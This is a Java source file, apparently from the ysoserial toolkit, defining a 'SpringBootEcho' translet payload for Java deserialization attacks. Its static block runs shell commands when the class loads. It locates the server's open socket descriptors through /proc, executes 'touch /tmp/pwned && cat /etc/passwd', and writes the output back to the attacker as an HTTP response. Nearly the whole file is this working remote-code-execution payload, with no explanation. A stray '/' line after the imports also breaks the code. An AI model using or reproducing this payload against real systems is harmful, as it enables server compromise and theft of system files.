package ysoserial.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
/

public class SpringBootEcho extends AbstractTranslet {

    static {
        try {
            String[] cmd = { "/bin/sh", "-c", "inode=`cat /proc/net/tcp|tail -n +2|awk '{if($4==\"01\")print}'|awk '{print $10}'`;for i in $inode; do fd=`ls -l /proc/$PPID/fd|grep socket|grep $i|awk '{print $9}'`; if [ ${#fd} -gt 0 ]; then echo -n $fd-;fi;done;"};
            java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
            java.io.InputStreamReader isr  = new java.io.InputStreamReader(in);
            java.io.BufferedReader br = new java.io.BufferedReader(isr);
            StringBuilder stringBuilder = new StringBuilder();
            String line;

            while ((line = br.readLine()) != null){
                stringBuilder.append(line);
            }

            System.out.println(stringBuilder.toString());
            String s = stringBuilder.toString().substring(0,stringBuilder.toString().length()-1);
            String[] temp = s.split("-");;

            for(int i=0;i<temp.length;i++) {
                int num = Integer.valueOf(temp[i]).intValue();


                cmd = new String[]{"/bin/sh", "-c", "touch /tmp/pwned && cat /etc/passwd"};

                in = Runtime.getRuntime().exec(cmd).getInputStream();
                isr = new java.io.InputStreamReader(in);
                br = new java.io.BufferedReader(isr);
                stringBuilder = new StringBuilder();

                while ((line = br.readLine()) != null) {
                    stringBuilder.append(line);
                }

                String ret = "HTTP/1.1 200\r\nContent-Length: "+Integer.toString(stringBuilder.toString().length()) +
                    "\r\n\r\n"+stringBuilder.toString();
                java.lang.reflect.Constructor c = java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});
                c.setAccessible(true);

                java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor) c.newInstance(new Object[]{new Integer(num)}));
                os.write(ret.getBytes());
                os.close();
            }

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
